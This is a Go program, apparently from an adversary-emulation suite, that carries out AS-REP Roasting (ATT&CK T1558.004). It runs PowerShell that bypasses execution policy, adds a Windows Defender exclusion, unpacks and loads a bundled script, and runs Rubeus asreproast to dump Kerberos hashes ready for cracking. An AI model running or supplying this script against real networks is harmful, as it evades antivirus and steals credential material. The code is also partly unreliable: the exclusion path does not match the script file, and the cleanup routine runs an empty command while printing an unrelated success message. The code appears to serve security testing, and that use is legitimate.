// T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting
package main

import (
	"fmt"
	"os/exec"
)

const outputDirectory = "C:\\Users\\Public"

func main() {
	if !isAdmin() {
		fmt.Println("[-] Not running as admin, exiting...")
		pressEnterToContinue()
		return
	}
	cmd := fmt.Sprintf("Set-ExecutionPolicy Bypass -Scope CurrentUser -Force;Set-MpPreference -ExclusionPath %s\\util.ps;"+
		"Expand-Archive -Path 'util.zip' -DestinationPath '%s' -Force;"+
		". %s\\util.ps1;Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", outputDirectory, outputDirectory, outputDirectory)

	res, output := execute_command(cmd, true)
	if !res {
		fmt.Println("[-] Error: ", output)
	} else {
		fmt.Println("[+] AS-REP Roasting Successful")
	}
	pressEnterToContinue()
}

func isAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	if err != nil {
		return false
	} else {
		return true
	}
}

func execute_command(cmd string, isPowershell bool) (bool, string) {
	cmd_shell := "powershell"
	if !isPowershell {
		cmd_shell = "cmd"
	}
	// Run Command and Capture Output as well as Error
	out, err := exec.Command(cmd_shell, "/C", cmd).CombinedOutput()
	cmd_out := string(out)
	return err == nil, string(cmd_out)
}

func cleanup() {
	cmd := fmt.Sprintf("")
	res, output := execute_command(cmd, true)
	if res {
		fmt.Println("Port Changed Successfully")
	} else {
		fmt.Println("Error: ", output)
	}
}

func pressEnterToContinue() {
	fmt.Println("Press ENTER to continue...")
	fmt.Scanln()
}
